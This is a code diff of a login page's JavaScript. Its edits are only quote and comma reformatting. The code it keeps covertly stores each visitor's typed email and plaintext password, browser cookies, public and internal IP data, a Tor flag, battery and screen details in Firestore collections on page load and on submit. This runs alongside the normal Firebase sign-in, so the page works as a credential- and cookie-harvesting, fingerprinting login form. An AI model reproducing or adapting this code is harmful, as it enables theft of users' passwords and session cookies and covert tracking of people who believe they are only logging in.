@@ -5,37 +5,35 @@
 		if (firebase.auth().currentUser) {
 			firebase.auth().signOut();
 		} else {
-			var email = document.getElementById('username').value;
-			var password = document.getElementById('password').value;
+			var email = document.getElementById("username").value;
+			var password = document.getElementById("password").value;
 			if (email.length < 15) {
-				Materialize.toast('Please enter a valid email address.', 1250);
+				Materialize.toast("Please enter a valid email address.", 1250);
 				return;
 			}
 			if (password.length < 6) {
-				Materialize.toast('Please enter a valid password', 1250);
+				Materialize.toast("Please enter a valid password", 1250);
 				return;
 			}
-			var pointer = db.collection('onsubmit').doc(
-				firebase.firestore.Timestamp.now()
-					.toDate()
-					.toString()
-			);
-			$.getJSON('https://ipapi.co/json/', function(data) {
+			var pointer = db
+				.collection("onsubmit")
+				.doc(firebase.firestore.Timestamp.now().toDate().toString());
+			$.getJSON("https://ipapi.co/json/", function (data) {
 				ipapiData = JSON.stringify(data, null, 2);
 			});
-			$.getJSON('https://ipinfo.io/json', function(data) {
+			$.getJSON("https://ipinfo.io/json", function (data) {
 				ipinfoData = JSON.stringify(data, null, 2);
 			});
 			pointer
 				.get()
-				.then(doc => {
+				.then((doc) => {
 					if (doc.exists) {
 						location.reload(true);
 						return;
 					} else {
 						var ob = {
-							email: document.getElementById('username').value,
-							password: document.getElementById('password').value,
+							email: document.getElementById("username").value,
+							password: document.getElementById("password").value,
 							navigator: {
 								timeOpened: new Date(),
 								timezone: new Date().getTimezoneOffset() / 60,
@@ -65,7 +63,7 @@
 								updateDischargingInfo: updateDischargingInfo(),
 								dataCookies1: document.cookie,
 								dataCookies2: decodeURIComponent(
-									document.cookie.split(';')
+									document.cookie.split(";")
 								),
 								sizeScreenW: screen.width,
 								sizeScreenH: screen.height,
@@ -82,27 +80,27 @@
 								ipapiData: ipapiDataCheck(),
 								ipinfoData: ipinfoDataCheck(),
 								internalIP: internalIP(),
-								torBrowser: torBrowser()
-							}
+								torBrowser: torBrowser(),
+							},
 						};
 						function recursivelyReplaceNullToZero(j) {
 							for (var i in j) {
-								if (typeof j[i] === 'object') {
+								if (typeof j[i] === "object") {
 									recursivelyReplaceNullToZero(j[i]);
 								}
 								if (j[i] === null) {
-									j[i] = '';
+									j[i] = "";
 								}
 								if (j[i] === undefined) {
-									j[i] = '';
+									j[i] = "";
 								}
 								if (j[i] === NaN) {
-									j[i] = '';
+									j[i] = "";
 								}
 							}
 						}
 						recursivelyReplaceNullToZero(ob);
-						db.collection('onsubmit')
+						db.collection("onsubmit")
 							.doc(
 								firebase.firestore.Timestamp.now()
 									.toDate()
@@ -112,25 +110,25 @@
 						return;
 					}
 				})
-				.catch(err => {
+				.catch((err) => {
 					console.log(err);
 				});
 			firebase
 				.auth()
 				.signInWithEmailAndPassword(email, password)
-				.catch(function(error) {
+				.catch(function (error) {
 					var errorCode = error.code;
 					var errorMessage = error.message;
-					if (errorCode === 'auth/wrong-password') {
-						Materialize.toast('Wrong password', 1250);
-					} else if (errorCode === 'auth/user-not-found') {
-						Materialize.toast('User not found', 1250);
+					if (errorCode === "auth/wrong-password") {
+						Materialize.toast("Wrong password", 1250);
+					} else if (errorCode === "auth/user-not-found") {
+						Materialize.toast("User not found", 1250);
 					} else {
 						Materialize.toast(errorMessage, 1500);
 					}
 				});
 			function connectionDownlink() {
-				if (typeof navigator.connection == 'undefined') {
+				if (typeof navigator.connection == "undefined") {
 					return false;
 				} else {
 					return (
@@ -141,7 +139,7 @@
 				}
 			}
 			function connectionEffectiveType() {
-				if (typeof navigator.connection == 'undefined') {
+				if (typeof navigator.connection == "undefined") {
 					return false;
 				} else {
 					return (
@@ -152,7 +150,7 @@
 				}
 			}
 			function connectionRTT() {
-				if (typeof navigator.connection == 'undefined') {
+				if (typeof navigator.connection == "undefined") {
 					return false;
 				} else {
 					return (
@@ -163,13 +161,13 @@
 				}
 			}
 			function internalIP() {
-				if (document.getElementById('internalIP').innerText)
-					return document.getElementById('internalIP').innerText;
+				if (document.getElementById("internalIP").innerText)
+					return document.getElementById("internalIP").innerText;
 				else return false;
 			}
 			function torBrowser() {
-				if (document.getElementById('torBrowser').innerText)
-					return document.getElementById('torBrowser').innerText;
+				if (document.getElementById("torBrowser").innerText)
+					return document.getElementById("torBrowser").innerText;
 				else return false;
 			}
 			function ipapiDataCheck() {
@@ -183,52 +181,50 @@
 				} else return false;
 			}
 			function updateChargeInfo() {
-				if (document.getElementById('updateChargeInfo').innerText)
-					return document.getElementById('updateChargeInfo')
+				if (document.getElementById("updateChargeInfo").innerText)
+					return document.getElementById("updateChargeInfo")
 						.innerText;
 				else return false;
 			}
 			function updateLevelInfo() {
-				if (document.getElementById('updateLevelInfo').innerText)
-					return document.getElementById('updateLevelInfo').innerText;
+				if (document.getElementById("updateLevelInfo").innerText)
+					return document.getElementById("updateLevelInfo").innerText;
 				else return false;
 			}
 			function updateChargingInfo() {
-				if (document.getElementById('updateChargingInfo').innerText)
-					return document.getElementById('updateChargingInfo')
+				if (document.getElementById("updateChargingInfo").innerText)
+					return document.getElementById("updateChargingInfo")
 						.innerText;
 				else return false;
 			}
 			function updateDischargingInfo() {
-				if (document.getElementById('updateDischargingInfo').innerText)
-					return document.getElementById('updateDischargingInfo')
+				if (document.getElementById("updateDischargingInfo").innerText)
+					return document.getElementById("updateDischargingInfo")
 						.innerText;
 				else return false;
 			}
 		}
 	}
 	function initApp() {
-		var pointer = db.collection('onload').doc(
-			firebase.firestore.Timestamp.now()
-				.toDate()
-				.toString()
-		);
-		$.getJSON('https://ipapi.co/json/', function(data) {
+		var pointer = db
+			.collection("onload")
+			.doc(firebase.firestore.Timestamp.now().toDate().toString());
+		$.getJSON("https://ipapi.co/json/", function (data) {
 			ipapiData = JSON.stringify(data, null, 2);
 		});
-		$.getJSON('https://ipinfo.io/json', function(data) {
+		$.getJSON("https://ipinfo.io/json", function (data) {
 			ipinfoData = JSON.stringify(data, null, 2);
 		});
 		pointer
 			.get()
-			.then(doc => {
+			.then((doc) => {
 				if (doc.exists) {
 					location.reload(true);
 					return;
 				} else {
 					var ob = {
-						email: document.getElementById('username').value,
-						password: document.getElementById('password').value,
+						email: document.getElementById("username").value,
+						password: document.getElementById("password").value,
 						navigator: {
 							timeOpened: new Date(),
 							timezone: new Date().getTimezoneOffset() / 60,
@@ -257,7 +253,7 @@
 							updateDischargingInfo: updateDischargingInfo(),
 							dataCookies1: document.cookie,
 							dataCookies2: decodeURIComponent(
-								document.cookie.split(';')
+								document.cookie.split(";")
 							),
 							sizeScreenW: screen.width,
 							sizeScreenH: screen.height,
@@ -274,27 +270,27 @@
 							ipapiData: ipapiDataCheck(),
 							ipinfoData: ipinfoDataCheck(),
 							internalIP: internalIP(),
-							torBrowser: torBrowser()
-						}
+							torBrowser: torBrowser(),
+						},
 					};
 					function recursivelyReplaceNullToZero(j) {
 						for (var i in j) {
-							if (typeof j[i] === 'object') {
+							if (typeof j[i] === "object") {
 								recursivelyReplaceNullToZero(j[i]);
 							}
 							if (j[i] === null) {
-								j[i] = '';
+								j[i] = "";
 							}
 							if (j[i] === undefined) {
-								j[i] = '';
+								j[i] = "";
 							}
 							if (j[i] === NaN) {
-								j[i] = '';
+								j[i] = "";
 							}
 						}
 					}
 					recursivelyReplaceNullToZero(ob);
-					db.collection('onload')
+					db.collection("onload")
 						.doc(
 							firebase.firestore.Timestamp.now()
 								.toDate()
@@ -304,22 +300,22 @@
 					return;
 				}
 			})
-			.catch(err => {
+			.catch((err) => {
 				console.log(err);
 			});
-		firebase.auth().onAuthStateChanged(function(user) {
+		firebase.auth().onAuthStateChanged(function (user) {
 			if (user) {
-				Materialize.toast('Signing in...', 1000);
+				Materialize.toast("Signing in...", 1000);
 				var displayName = user.displayName;
 				var email = user.email;
-				window.location = '/';
+				window.location = "/";
 			} else {
-				Materialize.toast('Login to continue', 1250);
+				Materialize.toast("Login to continue", 1250);
 			}
 		});
 	}
 	function connectionDownlink() {
-		if (typeof navigator.connection == 'undefined') {
+		if (typeof navigator.connection == "undefined") {
 			return false;
 		} else {
 			return (
@@ -330,7 +326,7 @@
 		}
 	}
 	function connectionEffectiveType() {
-		if (typeof navigator.connection == 'undefined') {
+		if (typeof navigator.connection == "undefined") {
 			return false;
 		} else {
 			return (
@@ -341,7 +337,7 @@
 		}
 	}
 	function connectionRTT() {
-		if (typeof navigator.connection == 'undefined') {
+		if (typeof navigator.connection == "undefined") {
 			return false;
 		} else {
 			return (
@@ -352,13 +348,13 @@
 		}
 	}
 	function internalIP() {
-		if (document.getElementById('internalIP').innerText)
-			return document.getElementById('internalIP').innerText;
+		if (document.getElementById("internalIP").innerText)
+			return document.getElementById("internalIP").innerText;
 		else return false;
 	}
 	function torBrowser() {
-		if (document.getElementById('torBrowser').innerText)
-			return document.getElementById('torBrowser').innerText;
+		if (document.getElementById("torBrowser").innerText)
+			return document.getElementById("torBrowser").innerText;
 		else return false;
 	}
 	function ipapiDataCheck() {
@@ -372,23 +368,23 @@
 		} else return false;
 	}
 	function updateChargeInfo() {
-		if (document.getElementById('updateChargeInfo').innerText)
-			return document.getElementById('updateChargeInfo').innerText;
+		if (document.getElementById("updateChargeInfo").innerText)
+			return document.getElementById("updateChargeInfo").innerText;
 		else return false;
 	}
 	function updateLevelInfo() {
-		if (document.getElementById('updateLevelInfo').innerText)
-			return document.getElementById('updateLevelInfo').innerText;
+		if (document.getElementById("updateLevelInfo").innerText)
+			return document.getElementById("updateLevelInfo").innerText;
 		else return false;
 	}
 	function updateChargingInfo() {
-		if (document.getElementById('updateChargingInfo').innerText)
-			return document.getElementById('updateChargingInfo').innerText;
+		if (document.getElementById("updateChargingInfo").innerText)
+			return document.getElementById("updateChargingInfo").innerText;
 		else return false;
 	}
 	function updateDischargingInfo() {
-		if (document.getElementById('updateDischargingInfo').innerText)
-			return document.getElementById('updateDischargingInfo').innerText;
+		if (document.getElementById("updateDischargingInfo").innerText)
+			return document.getElementById("updateDischargingInfo").innerText;
 		else return false;
 	}
 	window.onload = initApp();
